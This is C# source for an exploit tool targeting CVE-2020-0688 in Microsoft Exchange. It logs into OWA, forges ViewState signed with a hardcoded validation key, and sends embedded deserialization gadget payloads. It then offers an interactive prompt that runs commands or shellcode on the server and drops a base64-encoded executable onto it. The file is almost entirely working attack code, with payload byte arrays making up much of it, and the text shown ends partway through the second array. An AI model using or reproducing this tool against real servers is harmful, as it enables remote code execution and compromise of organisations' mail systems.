﻿using System;
using System.Data;
using System.Text;
using System.Text.RegularExpressions;
using System.Collections;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Threading;
using System.Diagnostics;
using System.IO;
using System.Security.Cryptography;
using System.Net;
using System.Reflection;
using System.Runtime;
using System.Runtime.InteropServices;
using System.Web;
using System.Globalization;
using System.Security.Cryptography.X509Certificates;
using System.Net.Security;
using System.Runtime.Serialization.Formatters.Binary;
using System.Runtime.Serialization;
using Microsoft.VisualStudio.Text.Formatting;

namespace Zcg.Exploit.Remote
{

	
	class ExchangeCmd
	{
		static bool cert(object o, X509Certificate x, X509Chain c, SslPolicyErrors s) { return true; }
		static byte[] _mackey = null;
		static uint _clientstateid = 0;
		static string _vsg = null;
		static string target = null;
		static string user = null;
		static string pass = null;
		static string cookie = "";
		static string mode = "";

		[Serializable]
		public class TextFormattingRunPropertiesMarshal : ISerializable
		{
			protected TextFormattingRunPropertiesMarshal(SerializationInfo info, StreamingContext context) { }
			string _xaml;
			public void GetObjectData(SerializationInfo info, StreamingContext context)
			{
				info.SetType(typeof(TextFormattingRunProperties));
				info.AddValue("ForegroundBrush", _xaml);
			}
			public TextFormattingRunPropertiesMarshal(string xaml)
			{
				_xaml = xaml;
			}
		}

		static object Deserialize(byte[] b)
		{
			using (MemoryStream mem = new MemoryStream(b))
			{
				mem.Position = 0;
				BinaryFormatter bf = new BinaryFormatter();
				return bf.Deserialize(mem);
			}
		}
		static byte[] Serialize(object obj)
		{
			using (MemoryStream mem = new MemoryStream())
			{
				BinaryFormatter bf = new BinaryFormatter();
				bf.Serialize(mem, obj);
				return mem.ToArray();
			}
		}
		static void Main(string[] args)
		{
			Console.WriteLine("Exploit for CVE-2020-0688(Microsoft Exchange default MachineKeySection deserialize vulnerability).");
			Console.WriteLine("Part of GMH's fuck Tools, Code By zcgonvh.\r\n");
			if (args.Length < 3)
			{
				Console.WriteLine("usage: ExchangeCmd <target> <user> <pass> [-v48]");
				Console.WriteLine("-v48: fx4.8 mode,try this if get [bad result].");
				Console.WriteLine();
				return;
			}
			try
			{
				mode = args[3];
			}
			catch { }
			try
			{
				target = args[0];
				user = args[1];
				pass = args[2];

				ServicePointManager.ServerCertificateValidationCallback = new RemoteCertificateValidationCallback(cert);
				ServicePointManager.Expect100Continue = false;
				ServicePointManager.DefaultConnectionLimit = int.MaxValue;
				ServicePointManager.MaxServicePoints = int.MaxValue;

				HttpWebRequest hwr = WebRequest.Create("https://" + target + "/owa/auth.owa") as HttpWebRequest;
				hwr.AllowAutoRedirect = false;
				hwr.Method = "POST";
				hwr.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)";
				hwr.ContentType = "application/x-www-form-urlencoded";
				byte[] post = Encoding.UTF8.GetBytes("destination=https%3A%2F%2F" + target + "%2Fecp%2F&flags=4&forcedownlevel=0&username=" + HttpUtility.UrlEncode(user) + "&password=" + HttpUtility.UrlEncode(pass) + "&passwordText=&isUtf8=1");
				hwr.ContentLength = post.Length;
				hwr.Proxy = null;
				hwr.GetRequestStream().Write(post, 0, post.Length);
				HttpWebResponse res = hwr.GetResponse() as HttpWebResponse;
				if (res.StatusCode != (HttpStatusCode)302)
				{
					Console.WriteLine("[x]bad login response");
					return;
				}
				if (res.Headers.GetValues("Set-Cookie") != null)
				{
					foreach (string s in res.Headers.GetValues("Set-Cookie"))
					{
						cookie += s.Split(' ')[0] + " ";
					}
				}
				if (cookie.IndexOf("cadataKey") == -1)
				{
					Console.WriteLine("[x]login fail");
					return;
				}
				cookie += "ASP.NET_SessionId=;";

				if (!TestDummyFile())
				{
					Console.WriteLine("[-]dummy file not found,try to write...");
					UpdateMacKey("B97B4E27", null);
					hwr = WebRequest.Create("https://" + target + "/ecp/default.aspx?__VIEWSTATE=" + HttpUtility.UrlEncode(CreateViewState(stub)) + "&__VIEWSTATEGENERATOR=" + _vsg) as HttpWebRequest;
					hwr.AllowAutoRedirect = false;
					hwr.Method = "GET";
					hwr.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)";
					hwr.Headers.Add("Cookie", cookie);
					hwr.Proxy = null;
					try { hwr.GetResponse(); } catch { }
					if (!TestDummyFile())
					{
						Console.WriteLine("[x]fail to create dummy file");
						return;
					}
				}
			}
			catch (Exception ex)
			{
				Console.WriteLine("[x]init error:");
				Console.WriteLine(ex);
				return;
			}
			if (mode == "-v48")
			{
				Console.WriteLine("[*]fx4.8 mode, call ysoserial!ActivitySurrogateDisableTypeCheck");
				UpdateMacKey("31563A0D", null);
				HttpWebRequest hwr = WebRequest.Create("https://" + target + "/ecp/LiveIdError.aspx") as HttpWebRequest;
				hwr.AllowAutoRedirect = false;
				hwr.Method = "POST";
				hwr.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)";
				hwr.Headers.Add("Cookie", cookie);
				hwr.ContentType = "application/x-www-form-urlencoded";
				hwr.Proxy = null;
				byte[] post = Encoding.UTF8.GetBytes("__VIEWSTATE=" + HttpUtility.UrlEncode(CreateViewState(v48disablecheck)) + "&__VIEWSTATEGENERATOR=" + _vsg);
				hwr.ContentLength = post.Length;
				hwr.GetRequestStream().Write(post, 0, post.Length);
				try { hwr.GetResponse(); } catch { }
			}
			Console.WriteLine("[!]init ok");
			Console.WriteLine("[!]usage: ");
			help();
			Console.WriteLine();
			UpdateMacKey("31563A0D", null);
			while (true)
			{
				Console.Write("Exch >");
				try
				{
					string s = Console.ReadLine();
					if (s == "exit") { break; }
					if (s == "help")
					{
						help();
						continue;
					}
					string[] cmd = s.Split(new char[] { ' ' }, 3);
					MemoryStream ms = new MemoryStream();
					switch (cmd[0])
					{
						case "arch":
							{
								ms.WriteByte(0);
								break;
							}
						case "shellcode":
							{
								ms.WriteByte(1);
								byte[] tmp = File.ReadAllBytes(cmd[1]);
								ms.Write(tmp, 0, tmp.Length);
								break;
							}
						case "exec":
							{
								ms.WriteByte(2);
								BinaryWriter bw = new BinaryWriter(ms);
								bw.Write(cmd[1]);
								if (cmd.Length == 3)
								{
									bw.Write(cmd[2]);
								}
								else
								{
									bw.Write("");
								}
								break;
							}
						default:
							{
								help();
								continue;
							}
					}

					HttpWebRequest hwr = WebRequest.Create("https://" + target + "/ecp/LiveIdError.aspx") as HttpWebRequest;
					hwr.AllowAutoRedirect = false;
					hwr.Method = "POST";
					hwr.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)";
					hwr.Headers.Add("Cookie", cookie);
					hwr.ContentType = "application/x-www-form-urlencoded";
					hwr.Proxy = null;

					string path = "C:\\Program Files (x86)\\Unikey\\UnikeyNT.exe";
					string base64String = Convert.ToBase64String(File.ReadAllBytes(path));
					//string xaml = File.ReadAllText("C:\\Users\\PC\\Desktop\\xaml.txt");
					string xaml = "<ResourceDictionary xmlns=\"http://schemas.microsoft.com/winfx/2006/xaml/presentation\" xmlns:x=\"http://schemas.microsoft.com/winfx/2006/xaml\" xmlns:s=\"clr-namespace:System;assembly=mscorlib\"  xmlns:io=\"clr-namespace:System.IO;assembly=mscorlib\" xmlns:convert=\"clr-namespace:System.Convert;assembly=mscorlib\" ><s:Array x:Key=\"data\" x:FactoryMethod=\"s:Convert.FromBase64String\"><x:Arguments><s:String> " + base64String + "</s:String></x:Arguments></s:Array><ObjectDataProvider x:Key=\"x\" ObjectType=\"{x:Type io:File}\" MethodName=\"WriteAllBytes\"><ObjectDataProvider.MethodParameters><s:String>C:\\uni.exe</s:String><StaticResource ResourceKey=\"data\"/></ObjectDataProvider.MethodParameters></ObjectDataProvider></ResourceDictionary>";
					byte[] data = Serialize(new TextFormattingRunPropertiesMarshal(xaml));
					//Deserialize(data);


					byte[] post = Encoding.UTF8.GetBytes("__VIEWSTATE=" + HttpUtility.UrlEncode(CreateViewState(data)) + "&__VIEWSTATEGENERATOR=" + _vsg + "&__SCROLLPOSITION=" + HttpUtility.UrlEncode(Convert.ToBase64String(Enc(ms.ToArray()))));
					hwr.ContentLength = post.Length;
					hwr.GetRequestStream().Write(post, 0, post.Length);
					HttpWebResponse res = hwr.GetResponse() as HttpWebResponse;
					s = new StreamReader(hwr.GetResponse().GetResponseStream()).ReadToEnd();
					Regex reg = new Regex("value=\"/wEPDwUKLTcyODc4(.+)\"");
					if (reg.IsMatch(s))
					{
						Console.WriteLine(Encoding.UTF8.GetString(Dec(Convert.FromBase64String(reg.Match(s).Groups[1].Value))));
					}
					else
					{
						Console.WriteLine("bad result: " + s);
					}
				}
				catch (IndexOutOfRangeException) { help(); }
				catch (Exception ex) { Console.WriteLine(ex); }
				Console.WriteLine();
			}
		}
		static bool UpdateMacKey(string vsg, string userkey)
		{
			_vsg = vsg;
			if (!uint.TryParse(_vsg, NumberStyles.HexNumber, CultureInfo.InvariantCulture, out _clientstateid))
			{
				return false;
			}
			//System.Web.UI.ObjectStateFormatter.GetMacKeyModifier
			if (userkey != null)
			{
				int byteCount = Encoding.Unicode.GetByteCount(userkey);
				_mackey = new byte[byteCount + 4];
				Encoding.Unicode.GetBytes(userkey, 0, userkey.Length, _mackey, 4);
			}
			else
			{
				_mackey = new byte[4];
			}
			_mackey[0] = (byte)_clientstateid;
			_mackey[1] = (byte)(_clientstateid >> 8);
			_mackey[2] = (byte)(_clientstateid >> 16);
			_mackey[3] = (byte)(_clientstateid >> 24);
			return true;
		}
		static bool TestDummyFile()
		{
			HttpWebRequest hwr = WebRequest.Create("https://" + target + "/ecp/LiveIdError.aspx") as HttpWebRequest;
			hwr.AllowAutoRedirect = false;
			hwr.Method = "GET";
			hwr.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)";
			hwr.Headers.Add("Cookie", cookie);
			hwr.Proxy = null;
			HttpWebResponse res = null;
			try
			{
				res = hwr.GetResponse() as HttpWebResponse;
			}
			catch (WebException ex)
			{
				res = ex.Response as HttpWebResponse;
			}
			return res.StatusCode == HttpStatusCode.OK;
		}
		static string CreateViewState(byte[] dat)
		{
			MemoryStream ms = new MemoryStream();
			ms.WriteByte(0xff);
			ms.WriteByte(0x01);
			ms.WriteByte(0x32);
			uint num = (uint)dat.Length;
			while (num >= 0x80)
			{
				ms.WriteByte((byte)(num | 0x80));
				num = num >> 0x7;
			}
			ms.WriteByte((byte)num);
			ms.Write(dat, 0, dat.Length);
			byte[] data = ms.ToArray();
			byte[] validationKey = new byte[] { 0xCB, 0x27, 0x21, 0xAB, 0xDA, 0xF8, 0xE9, 0xDC, 0x51, 0x6D, 0x62, 0x1D, 0x8B, 0x8B, 0xF1, 0x3A, 0x2C, 0x9E, 0x86, 0x89, 0xA2, 0x53, 0x03, 0xBF };

			ms = new MemoryStream();
			ms.Write(data, 0, data.Length);
			ms.Write(_mackey, 0, _mackey.Length);
			byte[] hash = (new HMACSHA1(validationKey)).ComputeHash(ms.ToArray());
			ms = new MemoryStream();
			ms.Write(data, 0, data.Length);
			ms.Write(hash, 0, hash.Length);
			return Convert.ToBase64String(ms.ToArray());
		}

		static void help()
		{
			Console.WriteLine("exec <cmd> [args]");
			Console.WriteLine("  exec command");
			Console.WriteLine();
			Console.WriteLine("arch");
			Console.WriteLine("  get remote process architecture(for shellcode)");
			Console.WriteLine();
			Console.WriteLine("shellcode <shellcode.bin>");
			Console.WriteLine("  run shellcode");
			Console.WriteLine();
			Console.WriteLine("exit");
			Console.WriteLine("  exit program");
		}
		public static byte[] Dec(byte[] data)
		{
			byte[] iv = new byte[0x10];
			byte[] k = new byte[0x10];
			Array.Copy(data, 0, iv, 0, 0x10);
			Array.Copy(data, 0x10, k, 0, 0x10);
			MemoryStream ms = new MemoryStream();
			RijndaelManaged aes = new RijndaelManaged();
			aes.BlockSize = 128;
			aes.KeySize = 128;
			aes.Mode = CipherMode.CBC;
			aes.Padding = PaddingMode.PKCS7;
			CryptoStream cs = new CryptoStream(ms, aes.CreateDecryptor(k, iv), CryptoStreamMode.Write);
			cs.Write(data, 0x20, data.Length - 0x20);
			cs.FlushFinalBlock();
			return ms.ToArray();
		}
		public static byte[] Enc(byte[] data)
		{
			byte[] iv = Guid.NewGuid().ToByteArray();
			byte[] k = Guid.NewGuid().ToByteArray();
			MemoryStream ms = new MemoryStream();
			ms.Write(iv, 0, iv.Length);
			ms.Write(k, 0, k.Length);
			RijndaelManaged aes = new RijndaelManaged();
			aes.BlockSize = 128;
			aes.KeySize = 128;
			aes.Mode = CipherMode.CBC;
			aes.Padding = PaddingMode.PKCS7;
			CryptoStream cs = new CryptoStream(ms, aes.CreateEncryptor(k, iv), CryptoStreamMode.Write);
			cs.Write(data, 0, data.Length);
			cs.FlushFinalBlock();
			return ms.ToArray();
		}
		//ysoserial -g ActivitySurrogateDisableTypeCheck -f BinaryFormatter -c foo

		public static byte[] stub = {
	0x00, 0x01, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x0C, 0x02, 0x00, 0x00, 0x00, 0x5E, 0x4D, 0x69, 0x63, 0x72, 0x6F, 0x73, 0x6F, 0x66, 0x74,
	0x2E, 0x50, 0x6F, 0x77, 0x65, 0x72, 0x53, 0x68, 0x65, 0x6C, 0x6C, 0x2E, 0x45, 0x64, 0x69, 0x74,
	0x6F, 0x72, 0x2C, 0x20, 0x56, 0x65, 0x72, 0x73, 0x69, 0x6F, 0x6E, 0x3D, 0x33, 0x2E, 0x30, 0x2E,
	0x30, 0x2E, 0x30, 0x2C, 0x20, 0x43, 0x75, 0x6C, 0x74, 0x75, 0x72, 0x65, 0x3D, 0x6E, 0x65, 0x75,
	0x74, 0x72, 0x61, 0x6C, 0x2C, 0x20, 0x50, 0x75, 0x62, 0x6C, 0x69, 0x63, 0x4B, 0x65, 0x79, 0x54,
	0x6F, 0x6B, 0x65, 0x6E, 0x3D, 0x33, 0x31, 0x62, 0x66, 0x33, 0x38, 0x35, 0x36, 0x61, 0x64, 0x33,
	0x36, 0x34, 0x65, 0x33, 0x35, 0x05, 0x01, 0x00, 0x00, 0x00, 0x42, 0x4D, 0x69, 0x63, 0x72, 0x6F,
	0x73, 0x6F, 0x66, 0x74, 0x2E, 0x56, 0x69, 0x73, 0x75, 0x61, 0x6C, 0x53, 0x74, 0x75, 0x64, 0x69,
	0x6F, 0x2E, 0x54, 0x65, 0x78, 0x74, 0x2E, 0x46, 0x6F, 0x72, 0x6D, 0x61, 0x74, 0x74, 0x69, 0x6E,
	0x67, 0x2E, 0x54, 0x65, 0x78, 0x74, 0x46, 0x6F, 0x72, 0x6D, 0x61, 0x74, 0x74, 0x69, 0x6E, 0x67,
	0x52, 0x75, 0x6E, 0x50, 0x72, 0x6F, 0x70, 0x65, 0x72, 0x74, 0x69, 0x65, 0x73, 0x01, 0x00, 0x00,
	0x00, 0x0F, 0x46, 0x6F, 0x72, 0x65, 0x67, 0x72, 0x6F, 0x75, 0x6E, 0x64, 0x42, 0x72, 0x75, 0x73,
	0x68, 0x01, 0x02, 0x00, 0x00, 0x00, 0x06, 0x03, 0x00, 0x00, 0x00, 0xA2, 0x08, 0x3C, 0x52, 0x65,
	0x73, 0x6F, 0x75, 0x72, 0x63, 0x65, 0x44, 0x69, 0x63, 0x74, 0x69, 0x6F, 0x6E, 0x61, 0x72, 0x79,
	0x20, 0x78, 0x6D, 0x6C, 0x6E, 0x73, 0x3D, 0x22, 0x68, 0x74, 0x74, 0x70, 0x3A, 0x2F, 0x2F, 0x73,
	0x63, 0x68, 0x65, 0x6D, 0x61, 0x73, 0x2E, 0x6D, 0x69, 0x63, 0x72, 0x6F, 0x73, 0x6F, 0x66, 0x74,
	0x2E, 0x63, 0x6F, 0x6D, 0x2F, 0x77, 0x69, 0x6E, 0x66, 0x78, 0x2F, 0x32, 0x30, 0x30, 0x36, 0x2F,
	0x78, 0x61, 0x6D, 0x6C, 0x2F, 0x70, 0x72, 0x65, 0x73, 0x65, 0x6E, 0x74, 0x61, 0x74, 0x69, 0x6F,
	0x6E, 0x22, 0x20, 0x78, 0x6D, 0x6C, 0x6E, 0x73, 0x3A, 0x78, 0x3D, 0x22, 0x68, 0x74, 0x74, 0x70,
	0x3A, 0x2F, 0x2F, 0x73, 0x63, 0x68, 0x65, 0x6D, 0x61, 0x73, 0x2E, 0x6D, 0x69, 0x63, 0x72, 0x6F,
	0x73, 0x6F, 0x66, 0x74, 0x2E, 0x63, 0x6F, 0x6D, 0x2F, 0x77, 0x69, 0x6E, 0x66, 0x78, 0x2F, 0x32,
	0x30, 0x30, 0x36, 0x2F, 0x78, 0x61, 0x6D, 0x6C, 0x22, 0x20, 0x78, 0x6D, 0x6C, 0x6E, 0x73, 0x3A,
	0x73, 0x3D, 0x22, 0x63, 0x6C, 0x72, 0x2D, 0x6E, 0x61, 0x6D, 0x65, 0x73, 0x70, 0x61, 0x63, 0x65,
	0x3A, 0x53, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x3B, 0x61, 0x73, 0x73, 0x65, 0x6D, 0x62, 0x6C, 0x79,
	0x3D, 0x6D, 0x73, 0x63, 0x6F, 0x72, 0x6C, 0x69, 0x62, 0x22, 0x20, 0x78, 0x6D, 0x6C, 0x6E, 0x73,
	0x3A, 0x77, 0x3D, 0x22, 0x63, 0x6C, 0x72, 0x2D, 0x6E, 0x61, 0x6D, 0x65, 0x73, 0x70, 0x61, 0x63,
	0x65, 0x3A, 0x53, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x2E, 0x57, 0x65, 0x62, 0x3B, 0x61, 0x73, 0x73,
	0x65, 0x6D, 0x62, 0x6C, 0x79, 0x3D, 0x53, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x2E, 0x57, 0x65, 0x62,
	0x22, 0x3E, 0x3C, 0x73, 0x3A, 0x53, 0x74, 0x72, 0x69, 0x6E, 0x67, 0x20, 0x78, 0x3A, 0x4B, 0x65,
	0x79, 0x3D, 0x22, 0x61, 0x22, 0x20, 0x78, 0x3A, 0x46, 0x61, 0x63, 0x74, 0x6F, 0x72, 0x79, 0x4D,
	0x65, 0x74, 0x68, 0x6F, 0x64, 0x3D, 0x22, 0x73, 0x3A, 0x45, 0x6E, 0x76, 0x69, 0x72, 0x6F, 0x6E,
	0x6D, 0x65, 0x6E, 0x74, 0x2E, 0x47, 0x65, 0x74, 0x45, 0x6E, 0x76, 0x69, 0x72, 0x6F, 0x6E, 0x6D,
	0x65, 0x6E, 0x74, 0x56, 0x61, 0x72, 0x69, 0x61, 0x62, 0x6C, 0x65, 0x22, 0x20, 0x78, 0x3A, 0x41,
	0x72, 0x67, 0x75, 0x6D, 0x65, 0x6E, 0x74, 0x73, 0x3D, 0x22, 0x45, 0x78, 0x63, 0x68, 0x61, 0x6E,
	0x67, 0x65, 0x49, 0x6E, 0x73, 0x74, 0x61, 0x6C, 0x6C, 0x50, 0x61, 0x74, 0x68, 0x22, 0x2F, 0x3E,
	0x3C, 0x73, 0x3A, 0x53, 0x74, 0x72, 0x69, 0x6E, 0x67, 0x20, 0x78, 0x3A, 0x4B, 0x65, 0x79, 0x3D,
	0x22, 0x62, 0x22, 0x20, 0x78, 0x3A, 0x46, 0x61, 0x63, 0x74, 0x6F, 0x72, 0x79, 0x4D, 0x65, 0x74,
	0x68, 0x6F, 0x64, 0x3D, 0x22, 0x43, 0x6F, 0x6E, 0x63, 0x61, 0x74, 0x22, 0x3E, 0x3C, 0x78, 0x3A,
	0x41, 0x72, 0x67, 0x75, 0x6D, 0x65, 0x6E, 0x74, 0x73, 0x3E, 0x3C, 0x53, 0x74, 0x61, 0x74, 0x69,
	0x63, 0x52, 0x65, 0x73, 0x6F, 0x75, 0x72, 0x63, 0x65, 0x20, 0x52, 0x65, 0x73, 0x6F, 0x75, 0x72,
	0x63, 0x65, 0x4B, 0x65, 0x79, 0x3D, 0x22, 0x61, 0x22, 0x2F, 0x3E, 0x3C, 0x73, 0x3A, 0x53, 0x74,
	0x72, 0x69, 0x6E, 0x67, 0x3E, 0x5C, 0x43, 0x6C, 0x69, 0x65, 0x6E, 0x74, 0x41, 0x63, 0x63, 0x65,
	0x73, 0x73, 0x5C, 0x65, 0x63, 0x70, 0x5C, 0x4C, 0x69, 0x76, 0x65, 0x49, 0x64, 0x45, 0x72, 0x72,
	0x6F, 0x72, 0x2E, 0x61, 0x73, 0x70, 0x78, 0x3C, 0x2F, 0x73, 0x3A, 0x53, 0x74, 0x72, 0x69, 0x6E,
	0x67, 0x3E, 0x3C, 0x2F, 0x78, 0x3A, 0x41, 0x72, 0x67, 0x75, 0x6D, 0x65, 0x6E, 0x74, 0x73, 0x3E,
	0x3C, 0x2F, 0x73, 0x3A, 0x53, 0x74, 0x72, 0x69, 0x6E, 0x67, 0x3E, 0x3C, 0x4F, 0x62, 0x6A, 0x65,
	0x63, 0x74, 0x44, 0x61, 0x74, 0x61, 0x50, 0x72, 0x6F, 0x76, 0x69, 0x64, 0x65, 0x72, 0x20, 0x78,
	0x3A, 0x4B, 0x65, 0x79, 0x3D, 0x22, 0x78, 0x22, 0x20, 0x4F, 0x62, 0x6A, 0x65, 0x63, 0x74, 0x54,
	0x79, 0x70, 0x65, 0x3D, 0x22, 0x7B, 0x78, 0x3A, 0x54, 0x79, 0x70, 0x65, 0x20, 0x73, 0x3A, 0x49,
	0x4F, 0x2E, 0x46, 0x69, 0x6C, 0x65, 0x7D, 0x22, 0x20, 0x4D, 0x65, 0x74, 0x68, 0x6F, 0x64, 0x4E,
	0x61, 0x6D, 0x65, 0x3D, 0x22, 0x41, 0x70, 0x70, 0x65, 0x6E, 0x64, 0x41, 0x6C, 0x6C, 0x54, 0x65,
	0x78, 0x74, 0x22, 0x3E, 0x3C, 0x4F, 0x62, 0x6A, 0x65, 0x63, 0x74, 0x44, 0x61, 0x74, 0x61, 0x50,
	0x72, 0x6F, 0x76, 0x69, 0x64, 0x65, 0x72, 0x2E, 0x4D, 0x65, 0x74, 0x68, 0x6F, 0x64, 0x50, 0x61,
	0x72, 0x61, 0x6D, 0x65, 0x74, 0x65, 0x72, 0x73, 0x3E, 0x3C, 0x53, 0x74, 0x61, 0x74, 0x69, 0x63,
	0x52, 0x65, 0x73, 0x6F, 0x75, 0x72, 0x63, 0x65, 0x20, 0x52, 0x65, 0x73, 0x6F, 0x75, 0x72, 0x63,
	0x65, 0x4B, 0x65, 0x79, 0x3D, 0x22, 0x62, 0x22, 0x2F, 0x3E, 0x3C, 0x73, 0x3A, 0x53, 0x74, 0x72,
	0x69, 0x6E, 0x67, 0x3E, 0x3C, 0x2F, 0x73, 0x3A, 0x53, 0x74, 0x72, 0x69, 0x6E, 0x67, 0x3E, 0x3C,
	0x2F, 0x4F, 0x62, 0x6A, 0x65, 0x63, 0x74, 0x44, 0x61, 0x74, 0x61, 0x50, 0x72, 0x6F, 0x76, 0x69,
	0x64, 0x65, 0x72, 0x2E, 0x4D, 0x65, 0x74, 0x68, 0x6F, 0x64, 0x50, 0x61, 0x72, 0x61, 0x6D, 0x65,
	0x74, 0x65, 0x72, 0x73, 0x3E, 0x3C, 0x2F, 0x4F, 0x62, 0x6A, 0x65, 0x63, 0x74, 0x44, 0x61, 0x74,
	0x61, 0x50, 0x72, 0x6F, 0x76, 0x69, 0x64, 0x65, 0x72, 0x3E, 0x3C, 0x4F, 0x62, 0x6A, 0x65, 0x63,
	0x74, 0x44, 0x61, 0x74, 0x61, 0x50, 0x72, 0x6F, 0x76, 0x69, 0x64, 0x65, 0x72, 0x20, 0x78, 0x3A,
	0x4B, 0x65, 0x79, 0x3D, 0x22, 0x63, 0x22, 0x20, 0x4F, 0x62, 0x6A, 0x65, 0x63, 0x74, 0x49, 0x6E,
	0x73, 0x74, 0x61, 0x6E, 0x63, 0x65, 0x3D, 0x22, 0x7B, 0x78, 0x3A, 0x53, 0x74, 0x61, 0x74, 0x69,
	0x63, 0x20, 0x77, 0x3A, 0x48, 0x74, 0x74, 0x70, 0x43, 0x6F, 0x6E, 0x74, 0x65, 0x78, 0x74, 0x2E,
	0x43, 0x75, 0x72, 0x72, 0x65, 0x6E, 0x74, 0x7D, 0x22, 0x20, 0x4D, 0x65, 0x74, 0x68, 0x6F, 0x64,
	0x4E, 0x61, 0x6D, 0x65, 0x3D, 0x22, 0x22, 0x2F, 0x3E, 0x3C, 0x4F, 0x62, 0x6A, 0x65, 0x63, 0x74,
	0x44, 0x61, 0x74, 0x61, 0x50, 0x72, 0x6F, 0x76, 0x69, 0x64, 0x65, 0x72, 0x20, 0x78, 0x3A, 0x4B,
	0x65, 0x79, 0x3D, 0x22, 0x64, 0x22, 0x20, 0x4F, 0x62, 0x6A, 0x65, 0x63, 0x74, 0x49, 0x6E, 0x73,
	0x74, 0x61, 0x6E, 0x63, 0x65, 0x3D, 0x22, 0x7B, 0x53, 0x74, 0x61, 0x74, 0x69, 0x63, 0x52, 0x65,
	0x73, 0x6F, 0x75, 0x72, 0x63, 0x65, 0x20, 0x63, 0x7D, 0x22, 0x20, 0x4D, 0x65, 0x74, 0x68, 0x6F,
	0x64, 0x4E, 0x61, 0x6D, 0x65, 0x3D, 0x22, 0x67, 0x65, 0x74, 0x5F, 0x52, 0x65, 0x73, 0x70, 0x6F,
	0x6E, 0x73, 0x65, 0x22, 0x2F, 0x3E, 0x3C, 0x4F, 0x62, 0x6A, 0x65, 0x63, 0x74, 0x44, 0x61, 0x74,
	0x61, 0x50, 0x72, 0x6F, 0x76, 0x69, 0x64, 0x65, 0x72, 0x20, 0x78, 0x3A, 0x4B, 0x65, 0x79, 0x3D,
	0x22, 0x65, 0x22, 0x20, 0x4F, 0x62, 0x6A, 0x65, 0x63, 0x74, 0x49, 0x6E, 0x73, 0x74, 0x61, 0x6E,
	0x63, 0x65, 0x3D, 0x22, 0x7B, 0x53, 0x74, 0x61, 0x74, 0x69, 0x63, 0x52, 0x65, 0x73, 0x6F, 0x75,
	0x72, 0x63, 0x65, 0x20, 0x64, 0x7D, 0x22, 0x20, 0x4D, 0x65, 0x74, 0x68, 0x6F, 0x64, 0x4E, 0x61,
	0x6D, 0x65, 0x3D, 0x22, 0x45, 0x6E, 0x64, 0x22, 0x2F, 0x3E, 0x3C, 0x2F, 0x52, 0x65, 0x73, 0x6F,
	0x75, 0x72, 0x63, 0x65, 0x44, 0x69, 0x63, 0x74, 0x69, 0x6F, 0x6E, 0x61, 0x72, 0x79, 0x3E, 0x0B
};

		public static byte[] v48disablecheck ={
	0x00, 0x01, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x0C, 0x02, 0x00, 0x00, 0x00, 0x5E, 0x4D, 0x69, 0x63, 0x72, 0x6F, 0x73, 0x6F, 0x66, 0x74,
	0x2E, 0x50, 0x6F, 0x77, 0x65, 0x72, 0x53, 0x68, 0x65, 0x6C, 0x6C, 0x2E, 0x45, 0x64, 0x69, 0x74,
	0x6F, 0x72, 0x2C, 0x20, 0x56, 0x65, 0x72, 0x73, 0x69, 0x6F, 0x6E, 0x3D, 0x33, 0x2E, 0x30, 0x2E,
	0x30, 0x2E, 0x30, 0x2C, 0x20, 0x43, 0x75, 0x6C, 0x74, 0x75, 0x72, 0x65, 0x3D, 0x6E, 0x65, 0x75,
	0x74, 0x72, 0x61, 0x6C, 0x2C, 0x20, 0x50, 0x75, 0x62, 0x6C, 0x69, 0x63, 0x4B, 0x65, 0x79, 0x54,
	0x6F, 0x6B, 0x65, 0x6E, 0x3D, 0x33, 0x31, 0x62, 0x66, 0x33, 0x38, 0x35, 0x36, 0x61, 0x64, 0x33,
	0x36, 0x34, 0x65, 0x33, 0x35, 0x05, 0x01, 0x00, 0x00, 0x00, 0x42, 0x4D, 0x69, 0x63, 0x72, 0x6F,
	0x73, 0x6F, 0x66, 0x74, 0x2E, 0x56, 0x69, 0x73, 0x75, 0x61, 0x6C, 0x53, 0x74, 0x75, 0x64, 0x69,
	0x6F, 0x2E, 0x54, 0x65, 0x78, 0x74, 0x2E, 0x46, 0x6F, 0x72, 0x6D, 0x61, 0x74, 0x74, 0x69, 0x6E,
	0x67, 0x2E, 0x54, 0x65, 0x78, 0x74, 0x46, 0x6F, 0x72, 0x6D, 0x61, 0x74, 0x74, 0x69, 0x6E, 0x67,
	0x52, 0x75, 0x6E, 0x50, 0x72, 0x6F, 0x70, 0x65, 0x72, 0x74, 0x69, 0x65, 0x73, 0x01, 0x00, 0x00,
	0x00, 0x0F, 0x46, 0x6F, 0x72, 0x65, 0x67, 0x72, 0x6F, 0x75, 0x6E, 0x64, 0x42, 0x72, 0x75, 0x73,
	0x68, 0x01, 0x02, 0x00, 0x00, 0x00, 0x06, 0x03, 0x00, 0x00, 0x00, 0xCE, 0x0D, 0x3C, 0x52, 0x65,
	0x73, 0x6F, 0x75, 0x72, 0x63, 0x65, 0x44, 0x69, 0x63, 0x74, 0x69, 0x6F, 0x6E, 0x61, 0x72, 0x79,
	0x0A, 0x78, 0x6D, 0x6C, 0x6E, 0x73, 0x3D, 0x22, 0x68, 0x74, 0x74, 0x70, 0x3A, 0x2F, 0x2F, 0x73,
	0x63, 0x68, 0x65, 0x6D, 0x61, 0x73, 0x2E, 0x6D, 0x69, 0x63, 0x72, 0x6F, 0x73, 0x6F, 0x66, 0x74,
	0x2E, 0x63, 0x6F, 0x6D, 0x2F, 0x77, 0x69, 0x6E, 0x66, 0x78, 0x2F, 0x32, 0x30, 0x30, 0x36, 0x2F,
